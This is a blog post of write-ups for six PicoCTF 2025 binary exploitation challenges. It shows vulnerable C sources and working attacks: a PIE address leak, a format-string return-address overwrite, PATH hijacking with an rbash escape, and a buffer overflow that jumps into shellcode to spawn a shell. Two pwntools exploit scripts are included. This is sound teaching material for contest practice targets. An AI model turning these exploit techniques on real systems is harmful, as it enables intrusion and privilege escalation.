---
layout: post
title:  "PicoCTF 2025 Binary Exploit Roundup"
date:   2025-03-18 00:22:04 -0700
toc: true
---

# PicoCTF 2025 Binary Exploit Roundup

Despite no heap exploitation problems in this year's PicoCTF, the binary exploitation problems were both very interesting and informative.

## PIE TIME

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

We note the binary is 64-bit:

```
$ file vuln
vuln: ELF 64-bit LSB pie executable, x86-64 [...]
```


In this problem, the program tells us the location of `main` loaded in memory, then jumps to any address the user enters.

Due to Address Space Layout Randomization (ASLR) of the instructions, (also called PIE or Position Independent Executable in the case that it is the base instruction pointer being random), we don't know
the address we want to jump to until we learn the location of an address.

Looking into the relevant areas of the disassembly of the binary, which we can obtain through `objdump -D <binary name>`:

```asm
00000000000012a7 <win>:
    12a7:	f3 0f 1e fa          	endbr64
    12ab:	55                   	push   rbp
[...]

000000000000133d <main>:
    133d:	f3 0f 1e fa          	endbr64
    1341:	55                   	push   rbp
    1342:	48 89 e5             	mov    rbp,rsp
[...]
```

The address of `win` is `00000000000012a7` and the address of `main` is `000000000000133d`. However, when the executable is loaded into memory, they aren't actually loaded at that address, but at a random offset plus that address. Each execution of the executable, the offset is different.
Getting the address of `main`, subtracting `000000000000133d` to get this offset, then adding `00000000000012a7` to get the address of `win` loaded in memory, which is what we have to input.
Note that all numbers here are in hexadecimal.

Example interaction:
```
$ nc rescued-float.picoctf.net 58649
Address of main: 0x5de97f6d233d
Enter the address to jump to, ex => 0x12345: 0x5de97f6d22a7
Your input: 5de97f6d22a7
You won!
picoCTF{<FLAG>}
```

We calculated that we needed to enter `0x5de97f6d22a7` = `0x5de97f6d233d` - `0x000000000000133d` + `0x00000000000012a7` e.g. using Python:
```
$ python3
>>> hex(0x5de97f6d233d - 0x000000000000133d + 0x00000000000012a7)
'0x5de97f6d22a7'
```

## PIE TIME 2

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void segfault_handler() {
  printf("Segfault Occurred, incorrect address.\n");
  exit(0);
}

void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```

We note again the program is 64-bit.

This time we don't get the address of `main` for free, we will have to get find the address of some instruction. We note that instead the program does `printf(buffer);` instead of `printf("%s", buffer);`
to print the buffer, it will interpret any `%` in `buffer` as a format string. This leaves open a vulnerability called a Format String Vulnerability. We will see later a more powerful way to leverage
this vulnerability, but for now we use this to insepct the stack.

### Arguments in x86-64

In x86-64, the first 6 functions are passed in through the registers `rdi`, `rsi`, `rdx`, `rcx`, `r8`, and `r9` respectively. The rest of the arguments are pushed onto the stack where they sit just
lower than the stack address. That means if `printf` expects an argument when it encounters a *format specifier* `%<specifier>`, it will first look for `rsi` (since the format string pointer
itself is passed through `rdi`), then `rdx`, then `rcx`, then `r8`, then `r9`, then down the stack, 8 bytes at a time.

By entering `%lx %lx %lx %lx %lx`... into the program, we can read off those 5 registers, then the entire stack, 8 (`l`) bytes at time, in hexadecimal (`x`).
Both because we want to speed things up, and buffer only holds up to 64 bytes, we can take advantage of a GCC extension to `printf` where a format specifier of the form `%<num>$<specifier>` will
act like the specifier, but the `num`-th argument passed in (1-indexed). We can use this to find the address that `call_functions` returns to back into main, which we can see is `0x1441`.

```
0000000000001400 <main>:
    1400:	f3 0f 1e fa          	endbr64
    [...]
    142f:	48 89 c7             	mov    rdi,rax
    1432:	e8 49 fd ff ff       	call   1180 <setvbuf@plt>
    1437:	b8 00 00 00 00       	mov    eax,0x0
    143c:	e8 86 fe ff ff       	call   12c7 <call_functions>
    1441:	b8 00 00 00 00       	mov    eax,0x0
    1446:	5d                   	pop    rbp
```

With a bit of trial and error, knowing that the random address that the instruction will load in an address with the same low bits as `0x1441` and will therefore end in `441`, we can find that printing
out the 19th (imaginary) arugment to `printf` will reveal the return address, which we can get by entering `%19$lx`. Once again, we can subtract `0x1441` from this value, and add back the address
of `win`, `0x136a`, we can enter the address to jump to.

Example interaction:
```
$ ./vuln
$ nc rescued-float.picoctf.net 62662
Enter your name:%19$lx
5b6438910441
 enter the address to jump to, ex => 0x12345: 0x5b643891036a
You won!
picoCTF{<FLAG>}
```

## hash-only-1

We take a little break from exploiting a binary and instead try to exploit a shell session. Upon `ssh`-ing into the given server and running the `flaghasher` binary
we are asked to, we are greeted with the MD5 hash of the flag:

```
$ ssh ctf-player@shape-facility.picoctf.net -p 53721
[...]
ctf-player@pico-chall$ ./flaghasher
Computing the MD5 hash of /root/flag.txt.... 

37b576b3ec8179c5714bcd173ce8c1cc  /root/flag.txt
```

While MD5 is known to be cryptographically insecure, it would still be infeasible to find what flag produces this hash.
Decompiling this binary using Ghidra gives nothing useful:

``` c
bool main(void)

{
  ostream *stream;
  char *c_str;
  long in_FS_OFFSET;
  bool bad_ret;
  allocator alloc;
  int ret;
  string str [40];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  stream = std::operator<<((ostream *)std::cout,"Computing the MD5 hash of /root/flag.txt.... ");
  stream = (ostream *)std::ostream::operator<<(stream,std::endl<>);
  std::ostream::operator<<(stream,std::endl<>);
  sleep(2);
  std::allocator<char>::allocator();
                    /* try { // try from 001013aa to 001013ae has its CatchHandler @ 0010144f */
  std::string::string(str,"/bin/bash -c \'md5sum /root/flag.txt\'",&alloc);
  std::allocator<char>::~allocator((allocator<char> *)&alloc);
  setgid(0);
  setuid(0);
  c_str = (char *)std::string::c_str();
                    /* try { // try from 001013de to 00101423 has its CatchHandler @ 0010146d */
  ret = system(c_str);
  bad_ret = ret != 0;
  if (bad_ret) {
    stream = std::operator<<((ostream *)std::cerr,"Error: system() call returned non-zero value: ");
    stream = (ostream *)std::ostream::operator<<(stream,ret);
    std::ostream::operator<<(stream,std::endl<>);
  }
  std::string::~string(str);
  if (canary == *(long *)(in_FS_OFFSET + 0x28)) {
    return bad_ret;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}
```

(As usual, variables names are by me, weirdness is by Ghidra).

Decompiling this binary wasn't even that necessary, the important part could have been found by just finding the command that the program runs:

```
ctf-player@pico-chall$ strings flaghasher | grep flag
Computing the MD5 hash of /root/flag.txt.... 
/bin/bash -c 'md5sum /root/flag.txt'
```

We have two possible plans of attack:

1. Hijack `/bin/bash` with a program to print out the flag, which should work since it would be run with root priviliges
2. Hijack `md5sum` with `cat` to just print out the flag

We check the protections of both files:

```
ctf-player@pico-chall$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1183448 Jun 18  2020 /bin/bash
ctf-player@pico-chall$ which md5sum
/usr/bin/md5sum
ctf-player@pico-chall$ ls -l /usr/bin/md5sum
-rwxrwxrwx 1 root root 47480 Sep  5  2019 /usr/bin/md5sum
```

The last 3 letters of the string at the start of the output to `ls -l` tell us what a regular user (us) can do to the file. In the case of `/bin/bash`, we can read and execute but not write,
in the case of `/usr/bin/md5sum`, we can read, write, and execute it. This means we can replace it with `cat`, provided we have read privileges to it.

```
ctf-player@pico-chall$ which cat
/usr/bin/cat
ctf-player@pico-chall$ ls -l /usr/bin/cat
-rwxr-xr-x 1 root root 43416 Sep  5  2019 /usr/bin/cat
ctf-player@pico-chall$ cp /usr/bin/cat /usr/bin/md5sum
```

Running the binary again, the program will just print out the flag now:
```
ctf-player@pico-chall$ cp /usr/bin/cat /usr/bin/md5sum
ctf-player@pico-chall$ ./flaghasher 
Computing the MD5 hash of /root/flag.txt.... 

picoCTF{<FLAG>}
```

## hash-only-2

We have very much the very same challenge, but this time when we log in, we're greeted by something else if we try the same thing...

```
ctf-player@pico-chall$ which flaghasher
/usr/local/bin/flaghasher
ctf-player@pico-chall$ flaghasher
Computing the MD5 hash of /root/flag.txt.... 

b5953e013f83240dab571e2bf2c21f5d  /root/flag.txt
ctf-player@pico-chall$ which md5sum
/usr/bin/md5sum
ctf-player@pico-chall$ ls -l /usr/bin/md5sum
-rwxr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/md5sum
```

This time we can't write to `/usr/bin/md5sum`. There's actually a third option I didn't discuss, setting `$PATH`, the environment variable that contains
all the directories the system will look for when running a command. By copying `cat` to the current directory, renaming it to `mdsum`, and setting the `$PATH` to the current
directory, `flaghasher` should run our fake version of `md5sum`:

```
ctf-player@pico-chall$ cp /usr/bin/cat ./md5sum
ctf-player@pico-chall$ pwd
/home/ctf-player
ctf-player@pico-chall$ export PATH='/home/ctf-player/'
-rbash: PATH: readonly variable
```

It would seem that we are logged in as restricted bash, which gives us a number of restrictions, including setting certain environment variables like `$PATH`. However, we are not restricted
from just running a different shell from here:

```
ctf-player@pico-chall$ ls /usr/bin | grep sh$
bash
c_rehash
chsh
dash
rbash
rsh
sh
ssh
```

Trying a few out, we see that `dash` (Debian Almquist shell) will work, even if it can't process the control codes that changes the color of text:
```
ctf-player@pico-chall$ dash
\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ export PATH='/home/ctf-player/'
\[\e[35m\]\u\[\e[m\]@\[\e[35m\]pico-chall\[\e[m\]$ /usr/local/bin/flaghasher
Computing the MD5 hash of /root/flag.txt.... 

picoCTF{<FLAG>}
```

## Echo Valley

Back to exploiting binaries, though with our old friend the format string vulnerability.

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void print_flag() {
    char buf[32];
    FILE *file = fopen("/home/valley/flag.txt", "r");

    if (file == NULL) {
      perror("Failed to open flag file");
      exit(EXIT_FAILURE);
    }
    
    fgets(buf, sizeof(buf), file);
    printf("Congrats! Here is your flag: %s", buf);
    fclose(file);
    exit(EXIT_SUCCESS);
}

void echo_valley() {
    printf("Welcome to the Echo Valley, Try Shouting: \n");

    char buf[100];

    while(1)
    {
        fflush(stdout);
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }

        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        printf("You heard in the distance: ");
        printf(buf);
        fflush(stdout);
    }
    fflush(stdout);
}

int main()
{
    echo_valley();
    return 0;
}
```

This time we can't just give an address to jump to. Let's pull out the standard tools. Running `checksec` on the binary:
```
RELRO           Stack Canary      NX            PIE
Full RELRO      Canary Found      NX enabled    PIE Enabled
```
Also, the binary is 64-bit.

We can see all the protections are enabled. For completness, let's break them down:

- Full RELRO (Full Relocation Read Only) means `.plt.got`, the section of the binary that determines where to jump to when calling builtin functions, is read-only, which means as funny as it would be, we can't exploit the program to jump to `print_flag` when it tries to call `fflush`
- For the stack canary, you may have noticed the `canary` variable in the decompiled `flaghasher` which does nothing but causes the program to call `__stack_chk_fail()` if it's changed. This 8-byte (4-byte on x86-32) value sits on the stack between the return address and the rest of the local variables, so if a buffer overflow occurs, it must overwrite the canary before overwriting the return address. If the canary is detected to have changed when the function returns, it will crash the program
- NX enabled means that certain areas of the memory, most importantly, the stack, is marked as No eXecute, meaning if the instruction pointer ever points to those areas, the program will crash instead of executing from there. This prevents us from writing instructions to the stack, then jumping execution to the stack
- PIE enabled means the same thing as in `PIE TIME`, and the memory addresses of instructions has a random offset added to them.

### Return of the Format String Vulnerability

Even with all of these protections, the `printf(buf)` call alone will let us write 8 bytes in a location of our choosing,
which we will use to overwrite the return address with the location to `print_flag`.

We've covered what `%lx` does, let's look at two more relevant format specifiers:

- `printf("%s", str)` where `str` is a `char*` will print out the memory that the pointer points to, one byte at a time, as text, until it encounters a `0` byte.
- `printf("%n", &num)` where `num` is an `int` (and `&num` is a pointer to it), will write to `num` how many bytes have been written so far in the format string before the specifier. For example, `printf("12345678901234%n", &num)` will write 14 bytes to `num`.
    - The variants `%hn` and `%hhn` instead of `%n` instead require a pointer to `short` and `char` respectively.

This means in order to view an address of our choosing using `printf(buf)` call,

- We must put an address on the stack. This can be done since `buf` itself is on the stack, so we can dedicate the first 8 characters of our input into `buf` as an address
- The next characters of our input should be `%<num>$s` where `<num>` is the number that makes it so the `<num>`-th (imaginary) argument of `printf` will point low enough in the stack to reach the start of `buf` where the address lies. We can find `<num>` by reasoning about the layout of the stack, but in the case of this problem, with some trial and error I found it to be `6`
- Now `printf` will print off bytes starting from the address we entered

To write one byte to any address we choose, we can do something similar

- Put the address on the stack as the first 8 characters of our input to `buf`
- Manipulate the string so that the number of characters we write up to this point is equal to the value
we want to write
    - One way is to just pad our input with spaces or `A` until we get to the desired length
    - Another way, if we don't have enough characters in the buffer, is to use `%<k>c` where `k` is the byte you want to write. This will print a character, left-padded with spaces, until `k` characters are printed
- The next characters should be `%<num>$n`, where `<num>` is the same one as the above

### 64-bit addresses

In a 64-bit program, even though a pointer address takes up 64 bits, only the lowest 48 bits are used, which means the top 16 bits or 2 bytes must be zero. This means if we try to write an address to the first 8 bytes, we will have to write 0-bytes. This is fine when entering an input, as `fgets` doesn't stop consuming input
when it encounters a 0-byte, just `\n`, but `printf(buf)` will stop as soon as it gets to the 0-byte.

To get around this, we can just put the address at the end of our input, making sure it is aligned to a 8-byte boundary on the stack. For this problem, this means inputting a number of characters that is a multiple of 8 before the address.

### The Full Exploit

To eventually jump to `print_flag`, we

1. View the return address using `%<num>$lx`. In this case, through trial and error, I found it to be `%21$lx`. Through looking at the disassembled binary, the return address is the offset + `0x1413`, the `print_flag` address is `0x1269`, so we subtract `0x1413` and add `0x1269` to get our `print_flag` address
2. Compute the address holding the return address on the stack. Through trial and error, I found `%20$lx` holds the previous base pointer that was backed up onto the stack at the beginning of the function. Subtracting 8 bytes gives us the address that we want
3. One byte at a time, write the new address into the return address. Strictly speaking, since we know that `print_flag` and the original return address are close in memory, and will share the highest 5 bytes, we only really need to write the lowest 3 bytes of the return address

Since we need to do a lot of computation at runtime as we interface with the program, we use pwntools

```py
from pwn import *
from sys import argv

conn = None
# Back up what we write into a text file
f = open('in.txt', 'wb')

# Helper functions to write to both the process and the text file
def write(s: bytes):
	conn.send(s)
	f.write(s)

def writeline(s: bytes):
	conn.sendline(s)
	f.write(s)
	f.write(b'\n')

# Setup connection to either use local binary or remote
if len(argv) < 2 or argv[1] == '-l':
	conn = process('./valley')
else:
	conn = remote('shape-facility.picoctf.net', 51442)

# Step 1: Leak an address relative to the instruction pointer
# Most easily done with the return address

# Leak 8-byte return address
writeline(b'%21$lx')
conn.recvline()
ret_addr = int(conn.recvline().decode().strip().split(': ')[1], 16)
print(f"Return address: {hex(ret_addr)}")
flag_addr = ret_addr - 0x1413 + 0x1269
print(f"Flag func address: {hex(flag_addr)}")

# Step 2: Leak an address on the stack to compute the address holding the return address

# Gets stack address of base next pointer
writeline(b'%20$lx')
ret_addr_loc = int(conn.recvline().decode().strip().split(': ')[1], 16) - 8
print(f"Return address location: {hex(ret_addr_loc)}")

# Step 3: Write flag function address directly into return address on stack

def write_byte(byte, addr):
	payload = f'%{byte}c'

	# Keep total payload length multiple of 8
	FMT_SPEC_LEN = 7
	padding = '+' * (8 - ((len(payload) + FMT_SPEC_LEN) % 8))
	total = len(payload) + FMT_SPEC_LEN + len(padding)
	assert total % 8 == 0

	# First 5 arguments are from registers instead of stack, plus 1 because 1-indexed
	# Plus one for each 8 characters we've written so far
	num = 6 + total // 8

	# Force format specifier to be 7 chars
	fmt = f'%{num}$hhn' if num >= 10 else f'%0{num}$hhn'

	payload = payload + fmt + padding

	print(b'Writing ' + str(byte).encode() + b' to address ' +
	   hex(addr).encode() + b': ' + payload.encode())
	# Put format spec plus address we want to write
	writeline(payload.encode() + p64(addr))

# Write one byte at a time using hhn
for i in range(3):
 	# Write lowest byte of address
	# Plus i, not minus i, because little-endian
	write_byte(flag_addr & 0xff, ret_addr_loc + i)
	# Shift address one byte to the right
	flag_addr >>= 8

writeline(b'exit')

# ===

f.close()
conn.interactive()
```

Example output:
```
[+] Opening connection to shape-facility.picoctf.net on port 51442: Done
Return address: 0x59f1d72f4413
Flag func address: 0x59f1d72f4269
Return address location: 0x7ffc91683618
b'Writing 105 to address 0x7ffc91683618: %105c%08$hhn++++'
b'Writing 66 to address 0x7ffc91683619: %66c%08$hhn+++++'
b'Writing 47 to address 0x7ffc9168361a: %47c%08$hhn+++++'
[*] Switching to interactive mode
You heard in the distance:                                                                                                         \xc0++++\x186h\You heard in the distance:                                                                  \xc0+++++\x196h\x91\xfcYou heard in the distance:                                               \xc0+++++\x1a6h\x91\xfcThe Valley Disappears
Congrats! Here is your flag: picoctf{<FLAG>}
[*] Got EOF while reading in interactive
$ 
[*] Closed connection to shape-facility.picoctf.net port 51442
```

## handoff

Despite the lack of heap exploitation problems, this year's binary exploitation section still proved to be reasonably challenging, with this being one of the most difficult stack exploitation problems I've solved

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>

#define MAX_ENTRIES 10
#define NAME_LEN 32
#define MSG_LEN 64

typedef struct entry {
	char name[8];
	char msg[64];
} entry_t;

void print_menu() {
	puts("What option would you like to do?");
	puts("1. Add a new recipient");
	puts("2. Send a message to a recipient");
	puts("3. Exit the app");
}

int vuln() {
	char feedback[8];
	entry_t entries[10];
	int total_entries = 0;
	int choice = -1;
	// Have a menu that allows the user to write whatever they want to a set buffer elsewhere in memory
	while (true) {
		print_menu();
		if (scanf("%d", &choice) != 1) exit(0);
		getchar(); // Remove trailing \n

		// Add entry
		if (choice == 1) {
			choice = -1;
			// Check for max entries
			if (total_entries >= MAX_ENTRIES) {
				puts("Max recipients reached!");
				continue;
			}

			// Add a new entry
			puts("What's the new recipient's name: ");
			fflush(stdin);
			fgets(entries[total_entries].name, NAME_LEN, stdin);
			total_entries++;
			
		}
		// Add message
		else if (choice == 2) {
			choice = -1;
			puts("Which recipient would you like to send a message to?");
			if (scanf("%d", &choice) != 1) exit(0);
			getchar();

			if (choice >= total_entries) {
				puts("Invalid entry number");
				continue;
			}

			puts("What message would you like to send them?");
			fgets(entries[choice].msg, MSG_LEN, stdin);
		}
		else if (choice == 3) {
			choice = -1;
			puts("Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: ");
			fgets(feedback, NAME_LEN, stdin);
			feedback[7] = '\0';
			break;
		}
		else {
			choice = -1;
			puts("Invalid option");
		}
	}
}

int main() {
	setvbuf(stdout, NULL, _IONBF, 0);  // No buffering (immediate output)
	vuln();
	return 0;
}
```

This time, we get no win function to jump to, meaning we need to spawn a shell. Checking with `checksec`:

```
RELRO           Stack Canary      NX            PIE
Partial RELRO   No Canary Found   NX disabled   PIE Disabled
```

Once again, the program is 64-bit.

Since `NAME_LEN` is 32 bytes but `feedback` is 8 bytes long, we can buffer overflow and write
24 bytes out of found.

This is very little, giving us 4 bytes leftover after overwriting the return address. Initially,
it seems we could just write shellcode to set up registers and memory, then a syscall to invoke `execve("/bin/sh")` on the stack and jump to it by
overwriting the return address with address of where we wrote our shellcode, but there doesn't seem
to be a way to leak a stack address. Despite PIE being disabled, the stack ASLR is enabled by default
at the kernel level, meaning we have no idea where we could jump to.

Usually when we have no leakable stack address, we can attempt a ROP (Return-Oriented Programming)
chain, where we look for pieces of code called gadgets that do something desirable, followed by `ret`.
Since `ret` pops 8 bytes as an address from the stack and jumps to it, if we overflow past the return
address on the stack, we also control what address gets popped, letting us jump to another gadget,
and so on until we've visited all gadgets we wanted, usually with the goal of invoking `execve("/bin/sh")`
through setting up registers and memory, then a syscall.

This is clearly not feasible, as we are left with 4 bytes after the return address, not even enough
for a single address. We are effectively given a single jump to somehow get to where we want on the stack.

The only thing with information that can point us towards the stack, without being on the stack already,
are the registers. Since we only get one jump and not even a single `ret` opportunity, we can only
work with jumping to points in the code that jump to an address or address relative to one held in
a register.

Looking through the assembly code, our candidates are `rbp`, `rsi`, `rdi`, and `rax`. Analyzing these options:

- Since we must overwrite `rbp` in order to overwrite the return address to get our first jump,
there's no point jumping to `jmp rbp` since we could have just jumped to that address
- Looking at GDB, `rsi` holds a small value, definitely not an address
- `rdi` holds a value on the stack but it is higher (lower address) than the top of the stack frame
and we cannot control it
- When we return from `vuln`, `rax` is still holding the return value of `fgets`. In the case that
`fgets` doesn't run into any errors, it returns the same `char*` passed into it, which in this case is `feedback`.
This is really useful since we control `feedback`, specifically the first 20 bytes except the eigth must be 0.

We can now run whatever 20 bytes of machine code we want, provided the eigth is 0, which is still
not enough for shellcode or a ROP chain, but enough to jump to a part of the stack that contains
our shellcode. Since we are now executing from the stack, we can compute the offset relative
to the instruction pointer to jump to.

The full exploit now becomes clear:

1. Set up shellcode on the stack by using the "message" feature of the app
2. "Give feedback" on the app, setting up `feedback` to have
    - Instructions to jump to the shellcode set up in the first 7 bytes
    - The address of a section of the code containing `jmp rax` in bytes 20 to 28 (either `0x40116c` or `0x4011a3`)

I had trouble with segfaults when not using short jump, so I ended up setting up all 10
entries and putting the shellcode in the 10th entry so it's close to `feedback`.

```py
from pwn import *
from sys import argv

conn = None
# Back up what we write into a text file
f = open('in.txt', 'wb')

# Helper functions to write to both the process and the text file
def write(s):
	conn.send(s)
	f.write(s)
def writeline(s):
	conn.sendline(s)
	f.write(s)
	f.write(b'\n')

if len(argv) < 2 or argv[1] == '-l':
	conn = process('./handoff')
else:
	conn = remote('shape-facility.picoctf.net', 54699)

def add_entry(name):
	writeline(b'1')
	writeline(name)

def send_msg(n, msg):
	writeline(b'2')
	writeline(str(n).encode('ascii'))
	writeline(msg)

def feedback(msg):
	writeline(b'3')
	writeline(msg)

# Open 10 entries
for i in range(10):
	add_entry(b'a')

context.arch = 'amd64'
shellcode = asm(shellcraft.amd64.linux.sh())

# Step 1: Set up shellcode in last entry
send_msg(9, shellcode)

# Step 2: Short jmp to shellcode in beginning of payload, overwrite
# return address at the end of payload to jump to rax

# Location of code containing jmp rax
jmp_rax = 0x40116c
# Jump 70 bytes back, accounting for these two bytes themselves too
jmp_to_shell= b'\xeb\xba'
padding = (b'\x00' * (20 - len(jmp_to_shell)))
payload = jmp_to_shell + padding + p64(jmp_rax)
assert len(payload) == 28, payload

feedback(payload)

# ===

f.close()
conn.interactive()
```

Example interaction:

```
[+] Opening connection to shape-facility.picoctf.net on port 54699: Done
[*] Switching to interactive mode
What option would you like to do?
1. Add a new recipient
2. Send a message to a recipient
3. Exit the app
What's the new recipient's name: 
What option would you like to do?
1. Add a new recipient
2. Send a message to a recipient
3. Exit the app
What's the new recipient's name: 
What option would you like to do?
1. Add a new recipient
2. Send a message to a recipient
3. Exit the app
What's the new recipient's name: 
What option would you like to do?
1. Add a new recipient
2. Send a message to a recipient
3. Exit the app
What's the new recipient's name: 
What option would you like to do?
1. Add a new recipient
2. Send a message to a recipient
3. Exit the app
What's the new recipient's name: 
What option would you like to do?
1. Add a new recipient
2. Send a message to a recipient
3. Exit the app
What's the new recipient's name: 
What option would you like to do?
1. Add a new recipient
2. Send a message to a recipient
3. Exit the app
What's the new recipient's name: 
What option would you like to do?
1. Add a new recipient
2. Send a message to a recipient
3. Exit the app
What's the new recipient's name: 
What option would you like to do?
1. Add a new recipient
2. Send a message to a recipient
3. Exit the app
What's the new recipient's name: 
What option would you like to do?
1. Add a new recipient
2. Send a message to a recipient
3. Exit the app
What's the new recipient's name: 
What option would you like to do?
1. Add a new recipient
2. Send a message to a recipient
3. Exit the app
Which recipient would you like to send a message to?
What message would you like to send them?
What option would you like to do?
1. Add a new recipient
2. Send a message to a recipient
3. Exit the app
Thank you for using this service! If you could take a second to write a quick review, we would really appreciate it: 
$ ls
flag.txt
handoff
start.sh
$ cat flag.txt
picoCTF{<FLAG>}
```